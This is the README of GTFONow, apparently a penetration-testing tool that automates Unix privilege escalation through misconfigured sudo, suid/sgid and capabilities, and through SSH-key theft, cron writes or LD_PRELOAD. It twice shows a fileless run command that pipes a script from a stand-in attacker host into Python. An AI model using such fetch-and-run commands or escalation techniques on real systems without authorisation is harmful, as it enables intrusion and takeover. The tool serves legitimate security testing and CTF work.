# GTFONow

Automatic privilege escalation for misconfigured capabilities, sudo config and setuid/setguid binaries.

## Features

| Feature                                                                                | Implemented        |
| -------------------------------------------------------------------------------------- | ------------------ |
| Automatically exploit misconfigured sudo permissions.                                  | :heavy_check_mark: |
| Automatically exploit misconfigured suid, sgid permissions.                            | :heavy_check_mark: |
| Automatically exploit misconfigured capabilities.                                      | :heavy_check_mark: |
| Automatically convert arbitrary file read primitive into shell by stealing SSH keys.   | :heavy_check_mark: |
| Automatically convert arbitrary file write primitive into shell by dropping SSH keys.  | :heavy_check_mark: |
| Automatically convert arbitrary file write primitive into shell by writing to cron.    | :heavy_check_mark: |
| Automatically convert arbitrary file write primitive into shell using LD_PRELOAD.      | :heavy_check_mark: |
| Single file, easy to run fileless with `curl http://attackerhost/gtfonow.py \| python` | :heavy_check_mark: |
| Interactionless mode. For environments where stdin is not controllable.                | Todo               |

## Compatibility

By design GTFONow is a backwards compatible, stdlib only python script, meaning it should work on any variant of Unix if Python is installed.

| Platform                               | Supports           |
| -------------------------------------- | ------------------ |
| Python2.\*                             | :heavy_check_mark: |
| Python3.\*                             | :heavy_check_mark: |
| No 3rd party dependencies              | :heavy_check_mark: |
| Any Unix Variant (Linux, MacOS,\*Nix)  | :heavy_check_mark: |
| Any architecture eg (X86/ARM64/X86-64) | :heavy_check_mark: |
| Systems without Python installed       | Todo               |

## Usage

To use `GTFONow`, simply run the script from your command line. The basic syntax is as follows:

```bash
python gtfo_now.py [OPTIONS]
```

It can also be run by piping the out put of curl:

```bash
curl http://attacker.host/gtfonow.py | python
```

### Options

Here are the options you can use with `GTFONow`:

- `--level`: Sets the level of checks to perform. You can choose between:

  - `1` (default) for a quick scan.
  - `2` for a more thorough scan.
  - Example: `python gtfonow.py --level 2`

- `--risk`: Specifies the risk level of the exploit to perform. The options are:

  - `1` (default) for safe operations.
  - `2` for more aggressive operations, primarily for use in CTFs, if using on real engagements, ensure you understand what this is doing.
  - Example: `python gtfonow.py --risk 2`

- `--sudo_password`: Enables sudo_password mode, offering more privilege escalation options if you know the sudo password.

  - This option does not require a value. You will be prompted to enter the sudo password via stdin.
  - Example: `python gtfonow.py --sudo_password`

- `--command`: Issues a single command instead of spawning an interactive shell. This is mainly for debugging purposes.

  - Example: `python gtfonow.py --command 'ls -la'`

- `-v`, `--verbose`: Enables verbose output.
  - Example: `python gtfonow.py --verbose`

### Examples

Here are some example commands to get you started:

1. Perform a quick scan:

   python gtfonow.py

2. Perform a thorough scan with a higher risk level:

   python gtfonow.py --level 2 --risk 2

## Usage Examples

### Default Mode - Scan All

[![asciicast](https://asciinema.org/a/CyEH3GyAFyWtIVjngWpa0hDBk.svg)](https://asciinema.org/a/CyEH3GyAFyWtIVjngWpa0hDBk)

### Capability Escalation

[![asciicast](https://asciinema.org/a/nmrMirrKNRrb7XHhVRYD66tWa.svg)](https://asciinema.org/a/nmrMirrKNRrb7XHhVRYD66tWa)

### Sudo Escalation and Verbose Mode

[![asciicast](https://asciinema.org/a/HdpWGxGAIAMahoJD6eoB6pqNq.svg)](https://asciinema.org/a/HdpWGxGAIAMahoJD6eoB6pqNq)

## Credits

- Payloads thanks to [GTFOBins](https://gtfobins.github.io/).
